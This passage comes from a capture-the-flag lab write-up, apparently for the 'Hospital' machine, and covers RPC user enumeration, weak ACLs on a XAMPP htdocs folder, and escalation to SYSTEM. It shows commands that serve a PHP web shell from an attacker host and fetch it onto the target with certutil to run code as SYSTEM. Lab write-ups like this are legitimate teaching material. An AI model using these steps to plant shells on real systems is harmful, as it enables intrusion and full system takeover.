- Remote Procedure Call (RPC) is a protocol that allows a program on one computer to execute a procedure (a subroutine or function) on another computer without needing to understand the network's details. In essence, RPC abstracts the complexities of network communication, allowing developers to focus on the implementation of the function rather than the communication mechanism. This is particularly useful in distributed systems, where different parts of an application may reside on different networked computers.
- RPC operates on a client-server model. The client makes a request for a procedure to be executed on the server. The RPC system then takes care of packaging the procedure's parameters, sending them over the network to the server, executing the requested procedure on the server with the supplied parameters, and then sending the result back to the client.

Once the RPC shell is established, executing `querydispinfo` will return a description of the various users on the target machine.

<img src="/assets/img/2024-hospital/rpc.png" alt="rpc.png" class="auto-resize">

This reveals the presence of a local administrator account.

Enumerating the directory structure further reveals the presence of  the `xampp\htdocs` folder.

*** A note on `xampp\htdocs`***
- The `xampp\htdocs` folder is a directory used by XAMPP, a popular open-source cross-platform web server solution stack package. XAMPP stands for Cross-Platform (X), Apache (A), MariaDB (M), PHP (P), and Perl (P). It is designed to be an easy-to-install Apache distribution containing MariaDB, PHP, and Perl, making it a convenient tool for developers to create and test web applications on their local machines before deploying them to a live server.*
- If found on a machine in a production environment or accessible over a network, it could be a security concern. XAMPP is not designed with security in mind for production use; its default configuration is meant for development purposes only, with minimal security settings. An improperly secured XAMPP installation accessible over a network can be exploited by malicious actors.


The permissions on the location reveal any user can read and execute to the location, and `NT Authority`  has full control.

A malicious file uploaded to the location could theoretically be executed  in the context of `NT Authority`.

```bash
*Evil-WinRM* PS C:\xampp\htdocs> Get-Acl | Format-List

Path   : Microsoft.PowerShell.Core\FileSystem::C:\xampp\htdocs
Owner  : BUILTIN\Administrators
Group  : HOSPITAL\Domain Users
Access : NT AUTHORITY\LOCAL SERVICE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  AppendData
         BUILTIN\Users Allow  CreateFiles
         CREATOR OWNER Allow  268435456
```

The shell used earlier was re-used here. First it was served locally on the attack machine and then retrieved on the Windows target within the potentially vulnerable `htdocs` folder.

```bash
──(kali㉿kali)-[~/…/htb-machines/hospital/exploits/p0wny-shell]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```powershell
*Evil-WinRM* PS C:\xampp\htdocs> certutil -urlcache -f http://10.10.14.2:8000/shell.php shell.php
```

Browsing to the uploaded shell on the Windows machine successfully obtains another webshell in the context of the `NT Authority` user.

The root flag is found.

```powershell
DC$@DC:C:\xampp\htdocs# whoami
nt authority\system

DC$@DC:C:\xampp\htdocs# type c:\Users\Administrator\Desktop\root.txt
<REDACTED>
```